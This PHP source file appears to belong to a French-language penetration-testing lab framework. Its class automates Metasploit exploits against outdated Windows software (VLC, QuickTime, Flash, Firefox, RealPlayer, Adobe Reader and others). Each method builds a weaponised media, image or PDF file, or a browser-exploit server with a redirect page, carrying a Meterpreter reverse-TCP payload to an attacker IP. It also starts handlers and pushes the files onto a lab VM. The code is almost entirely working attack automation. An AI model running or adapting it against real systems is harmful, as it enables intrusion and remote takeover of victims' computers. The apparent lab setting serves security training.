<?php

/*
 Trojan Win :
 Sub7, BlackShades, GhostRAT
 Most importantly, most anti-virus tools do not detect VNC, because it is such a widely used legitimate remote
administration tool.
test metasploit payload vnc 

 
 In general, there are (currently) five different methods for manipulating the kernel being publicly discussed
Loadable kernel modules (UNIX) and device drivers (Windows)
2. Altering kernel in memory
3. Changing kernel file on hard drive
4. Virtualizing the system



https://github.com/ytisf/theZoo

 */
class malware4win extends bin4win{
    var $target_ip ;
    var $target_port;
    var $target_vmx_name;
    var $attacker_ip ;
    var $attacker_port ;
    



    public function __construct($target_vmx_name,$target_ip,$target_port,$attacker_ip,$attacker_port,$file_path_output,$snapshot) {
	parent::__construct($file_path_output);
	$this->target_ip = trim($target_ip);
	$this->target_port = trim($target_port);
	$this->target_vmx_name = trim($target_vmx_name);
	$this->attacker_ip= trim($attacker_ip);
	$this->attacker_port= trim($attacker_port);
	}
	


	

	
	
	public function bof2exp4app4local2vlc($filename){
	    $vmx = new vm("xp3") ;
	    $file = new FILE($filename);
	    // windows/vncinject/reverse_tcp
	    // set LPORT $this->attacker_port;\
	    // set AutoRunScript post/linux/gather/enum_system
	    
	    $this->ssTitre("VLC" );
	    $this->article("Vuln VLC VERSION","1.1.8");
	    
	    
	    $query = "echo \"use exploit/windows/fileformat/vlc_modplug_s3m\nset FILENAME $file->file_ext\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST $this->attacker_ip\nset LPORT $this->attacker_port\nrun\nexit\n\" > $this->dir_tmp/".__FUNCTION__.".rc";
	    $this->requette($query);
	    $cmd = "msfconsole -q -r $this->dir_tmp/".__FUNCTION__.".rc -y /usr/share/metasploit-framework/config/database.yml " ;
	    
	    
	    if (!file_exists($file->file_path)) $this->requette($cmd);else $this->cmd("localhost", $cmd);
	    system("mv -v /home/$this->user2local/.msf4/local/poc_vlc.s3m $file->file_path");
	    $this->cmd("localhost","msfconsole -q -x \"use exploit/multi/handler;set RHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
	    $vmx->vm2upload($file->file_path, "$vmx->vm_tmp_win\\$file->file_ext" );
	    //$file->file_file2virus2vt();
	    
	    return $file;
	}
	
	public function bof2exp4app4local2quicktime($filename){
	    $vmx = new vm("xp3") ;
	    
	    $this->ssTitre("Browser IE Plugin QuickTime" );
	    $this->article("Vuln QUICKTIME VERSION","Apple QuickTime Player 7.6.6 and 7.6.7 on Windows XP SP3");
	    
	    $this->requette("echo '<meta http-equiv=\"refresh\" content=\"0; url=http://$this->attacker_ip:$this->attacker_port/\" />' > $this->dir_tmp/$filename");
	    $query = "echo \"use exploit/windows/browser/apple_quicktime_marshaled_punk\nset SRVHOST $this->attacker_ip\nset URIPATH $filename\nset SRVPORT $this->attacker_port\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST $this->attacker_ip\nset LPORT 8092\nrun\n\" > $this->dir_tmp/".__FUNCTION__.".rc";
	    $this->requette($query);
	    $cmd = "msfconsole -q -r $this->dir_tmp/".__FUNCTION__.".rc -y /usr/share/metasploit-framework/config/database.yml " ;
	    
	    
	    $this->cmd("localhost",$cmd);
	    $this->cmd("$this->xp3:$this->target_ip","IE -> http://$this->attacker_ip:$this->attacker_port/$filename");
	    $this->pause();
	    
	}
	
	public function bof2exp4app4local2flash($filename){
	    $vmx = new vm("xp3") ;
	    
	    $this->ssTitre("Flash" );
	    $this->article("Vuln ADOBE FLASH VERSION","Adobe Flash Player 10.3 AVM Verification Logic Array Indexing Code Execution");
	    
	    $this->requette("echo '<meta http-equiv=\"refresh\" content=\"0; url=http://$this->attacker_ip:$this->attacker_port/\" />' > $this->dir_tmp/$filename");
	    
	    $query = "echo \"use exploit/windows/browser/adobe_flashplayer_arrayindexing\nset SRVHOST $this->attacker_ip\nset URIPATH $filename\nset SRVPORT $this->attacker_port\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST $this->attacker_ip\nset LPORT 8091\nrun\" > $this->dir_tmp/".__FUNCTION__.".rc";
	    $this->requette($query);
	    $cmd = "msfconsole -q -r $this->dir_tmp/".__FUNCTION__.".rc -y /usr/share/metasploit-framework/config/database.yml " ;
	    
	    $this->cmd("localhost",$cmd);
	    $this->cmd("$this->xp3:$this->target_ip","IE -> http://$this->attacker_ip:$this->attacker_port/$filename");
	    $this->pause();
	}
	
	public function bof2exp4app4local2firefox($filename){
	    $this->ssTitre("Browser Firefox" );
	    $vmx = new vm("xp3") ;
	    
	    
	    $this->article("Vuln FIREFOX VERSION","Firefox 3.5 escape() Return Value Memory Corruption");
	    
	    $this->requette("echo '<meta http-equiv=\"refresh\" content=\"0; url=http://$this->attacker_ip:$this->attacker_port/\" />' > $this->dir_tmp/$filename");
	    
	    $query = "echo \"use exploit/multi/browser/firefox_escape_retval\nset SRVHOST $this->attacker_ip\nset URIPATH $filename\nset SRVPORT $this->attacker_port\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST $this->attacker_ip\nset LPORT 8090\nrun\" > $this->dir_tmp/".__FUNCTION__.".rc";
	    $this->requette($query);
	    $cmd = "msfconsole -q -r $this->dir_tmp/".__FUNCTION__.".rc -y /usr/share/metasploit-framework/config/database.yml " ;
	    
	    $this->cmd("localhost",$cmd);$this->pause();
	    $this->cmd("$this->xp3:$this->target_ip","Firefox -> http://$this->attacker_ip:$this->attacker_port/$filename");
	    
	}
	
	public function bof2exp4app4local2realplayer($filename){
	    $this->ssTitre("Real Player" );
	    $vmx = new vm("xp3") ;
	    $file = new FILE($filename);
	    
	    $this->article("Vuln REALPLAYER VERSION","Windows XP SP3 / Real Player 15.0.5.109");
	    
	    $query = "echo \"use exploit/windows/fileformat/real_player_url_property_bof\nset FILENAME $file->file_ext\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST $this->attacker_ip\nset LPORT $this->attacker_port\nrun\nexit\n\" > $this->dir_tmp/".__FUNCTION__.".rc";
	    $this->requette($query);
	    $cmd = "msfconsole -q -r $this->dir_tmp/".__FUNCTION__.".rc -y /usr/share/metasploit-framework/config/database.yml " ;
	    
	    
	    if (!file_exists($file->file_path)) $this->requette($cmd);else $this->cmd("localhost", $cmd);
	    $this->requette("cp -v /home/$this->user2local/.msf4/local/$file->file_ext $file->file_path");
	    $this->cmd("localhost","msfconsole -q -x \"use exploit/multi/handler;set RHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
	    $vmx->vm2upload($file->file_path, "$vmx->vm_tmp_win\\$file->file_ext" );
	    //$file->file_file2virus2vt();
	    return $file;
	}
	
	public function bof2exp4app4local2mp3($filename){
	    $this->ssTitre("MP3" );
	    $vmx = new vm("xp3") ;
	    $file = new FILE($filename);
	    
	    $this->article("Vuln ABBS VERSION","Audio Media Player 3.1 / Windows XP SP3 / Windows 7 SP1");
	    
	    $query = "echo \"use exploit/windows/fileformat/abbs_amp_lst\nset FILENAME $file->file_ext\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST $this->attacker_ip\nset LPORT $this->attacker_port\nrun\nexit\n\" > $this->dir_tmp/".__FUNCTION__.".rc";
	    $this->requette($query);
	    $cmd = "msfconsole -q -r $this->dir_tmp/".__FUNCTION__.".rc -y /usr/share/metasploit-framework/config/database.yml " ;
	    
	    
	    if (!file_exists($file->file_path)) $this->requette($cmd);else $this->cmd("localhost", $cmd);
	    $this->requette("cp -v /home/$this->user2local/.msf4/local/$file->file_ext $file->file_path");
	    $this->cmd("localhost","msfconsole -q -x \"use exploit/multi/handler;set RHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
	    $vmx->vm2upload($file->file_path, "$vmx->vm_tmp_win\\$file->file_ext" );
	    //$file->file_file2virus2vt();
	    return $file;
	}
	
	public function bof2exp4app4local2img($filename){
	    $this->ssTitre("IMAGE" );
	    $vmx = new vm("xp3") ;
	    $file = new FILE($filename);
	    
	    $this->article("Vuln CHASYS VERSION","Chasys Draw IES 4.10.01 / Windows XP SP3 / Windows 7 SP1");
	    
	    $query = "echo \"use exploit/windows/fileformat/chasys_draw_ies_bmp_bof\nset FILENAME $file->file_ext\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST $this->attacker_ip\nset LPORT $this->attacker_port\nrun\nexit\n\" > $this->dir_tmp/".__FUNCTION__.".rc";
	    $this->requette($query);
	    $cmd = "msfconsole -q -r $this->dir_tmp/".__FUNCTION__.".rc -y /usr/share/metasploit-framework/config/database.yml " ;
	    
	    if (!file_exists($file->file_path)) $this->requette($cmd);else $this->cmd("localhost", $cmd);
	    $this->requette("cp -v /home/$this->user2local/.msf4/local/$file->file_ext $file->file_path");
	    $this->cmd("localhost","msfconsole -q -x \"use exploit/multi/handler;set RHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
	    $vmx->vm2upload($file->file_path, "$vmx->vm_tmp_win\\$file->file_ext" );
	    //$file->file_file2virus2vt();
	    return $file;
	}
	
	public function bof2exp4app4local2pdf($filename){
	    $this->ssTitre("Fichier PDF" );
	    $vmx = new vm($this->target_vmx_name) ;
	    $file = new FILE($filename);
	    
	    $this->article("Vuln PDF VERSION","Adobe Reader v8.1.1(Windows XP SP0-SP3 English)");
	    
	    $query = "echo \"use exploit/windows/fileformat/adobe_collectemailinfo\nset FILENAME $file->file_ext\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST $this->attacker_ip\nset LPORT $this->attacker_port\nrun\nexit\n\" > $this->dir_tmp/".__FUNCTION__.".rc";
	    $this->requette($query);
	    $cmd = "msfconsole -q -r $this->dir_tmp/".__FUNCTION__.".rc -y /usr/share/metasploit-framework/config/database.yml " ;
	    
	    
	    if (!file_exists($file->file_path)) $this->requette($cmd);else $this->cmd("localhost", $cmd);
	    $this->requette("cp -v /home/$this->user2local/.msf4/local/$file->file_ext $file->file_path");
	    $this->cmd("localhost","msfconsole -q -x \"use exploit/multi/handler;set RHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
	    $vmx->vm2upload($file->file_path, "$vmx->vm_tmp_win\\$file->file_ext" );
	    //$file->file_file2virus2vt();
	    $file->file_file2sandbox("cuckoo1");
	    return $file;
	}
	
	
	

	
	
	
}


?>